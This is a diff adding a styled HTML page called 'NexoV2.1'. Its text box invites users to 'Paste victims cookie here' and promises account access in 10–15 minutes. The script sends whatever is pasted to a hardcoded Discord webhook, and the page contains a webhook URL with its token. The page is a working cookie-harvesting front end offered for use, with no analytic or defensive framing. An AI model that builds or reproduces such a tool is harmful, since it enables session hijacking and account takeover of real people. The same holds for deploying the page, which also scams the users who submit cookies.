@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Paste Tool with Animated Orbs</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      background: #000;
+      font-family: 'Orbitron', sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #orbCanvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 0;
+      pointer-events: none;
+      background: transparent;
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
+      background: rgba(255, 255, 255, 0.05);
+      padding: 40px;
+      border-radius: 16px;
+      box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(12px);
+      width: 480px;
+      max-width: 90vw;
+      text-align: center;
+      margin: auto;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      color: #fff;
+    }
+
+    textarea {
+      width: 100%;
+      height: 200px;
+      padding: 15px;
+      font-size: 1rem;
+      background-color: #111;
+      color: #eee;
+      border: 1px solid #555;
+      border-radius: 8px;
+      resize: vertical;
+      outline: none;
+      margin-bottom: 10px;
+    }
+
+    button {
+      background: linear-gradient(90deg, #ffffff, #cccccc);
+      color: #000;
+      border: none;
+      padding: 12px 24px;
+      font-size: 1rem;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: linear-gradient(90deg, #dddddd, #bbbbbb);
+    }
+
+    .message {
+      margin-top: 15px;
+      color: #aaffaa;
+      display: none;
+    }
+
+    .disclaimer {
+      font-size: 0.75rem;
+      color: #aaa;
+      margin-bottom: 15px;
+    }
+  </style>
+</head>
+<body>
+  <canvas id="orbCanvas"></canvas>
+
+  <div class="container">
+    <h1>NexoV2.1</h1>
+    <textarea id="pasteArea" placeholder="Paste victims cookie here..."></textarea>
+    <div class="disclaimer">👻waitime will be 10 - 15 minutes depending on the account	your trying to beam👻</div>
+    <button onclick="submitText()">Submit</button>
+    <div class="message" id="messageBox">✅ Submitted successfully!</div>
+  </div>
+
+  <script>
+    // Orb animation
+    const canvas = document.getElementById('orbCanvas');
+    const ctx = canvas.getContext('2d');
+    let width, height;
+
+    function resize() {
+      width = window.innerWidth;
+      height = window.innerHeight;
+      canvas.width = width;
+      canvas.height = height;
+    }
+    window.addEventListener('resize', resize);
+    resize();
+
+    class Orb {
+      constructor() { this.reset(); }
+      reset() {
+        this.x = Math.random() * width;
+        this.y = Math.random() * height;
+        this.radius = 10 + Math.random() * 20;
+        this.alpha = 0;
+        this.alphaDirection = 1;
+        this.speedX = (Math.random() - 0.5) * 0.1;
+        this.speedY = (Math.random() - 0.5) * 0.1;
+        this.alphaSpeed = 0.002 + Math.random() * 0.003;
+      }
+      update() {
+        this.x += this.speedX;
+        this.y += this.speedY;
+        if (this.x < 0 || this.x > width) this.speedX *= -1;
+        if (this.y < 0 || this.y > height) this.speedY *= -1;
+        this.alpha += this.alphaDirection * this.alphaSpeed;
+        if (this.alpha >= 0.5) this.alphaDirection = -1;
+        if (this.alpha <= 0) this.alphaDirection = 1;
+      }
+      draw() {
+        const gradient = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.radius);
+        gradient.addColorStop(0, `rgba(255, 255, 255, ${this.alpha})`);
+        gradient.addColorStop(1, 'rgba(255, 255, 255, 0)');
+        ctx.fillStyle = gradient;
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+        ctx.fill();
+      }
+    }
+
+    const orbs = [];
+    for (let i = 0; i < 30; i++) orbs.push(new Orb());
+
+    function animate() {
+      ctx.clearRect(0, 0, width, height);
+      orbs.forEach(orb => { orb.update(); orb.draw(); });
+      requestAnimationFrame(animate);
+    }
+    animate();
+
+    // Submit and send to Discord
+    function submitText() {
+      const text = document.getElementById('pasteArea').value.trim();
+      const msgBox = document.getElementById('messageBox');
+
+      if (text !== "") {
+        msgBox.style.display = 'block';
+
+        const webhookURL = "https://discord.com/api/webhooks/1402842617024348191/57l-IWkx0n6tM8NBYU1W0OyHsXmifMCru9Qh2fJCtCiLlaN-hzydhDKrSGM3ffmHmkkD"; // Replace this
+
+        fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: `📋 New Paste Submission:\n${text}` })
+        }).then(res => {
+          if (!res.ok) throw new Error("Failed to send to Discord");
+        }).catch(err => {
+          console.error(err);
+          alert("Error sending to Discord.");
+        });
+
+      } else {
+        alert("Please paste something first.");
+        msgBox.style.display = 'none';
+      }
+    }
+  </script>
+</body>
+</html>
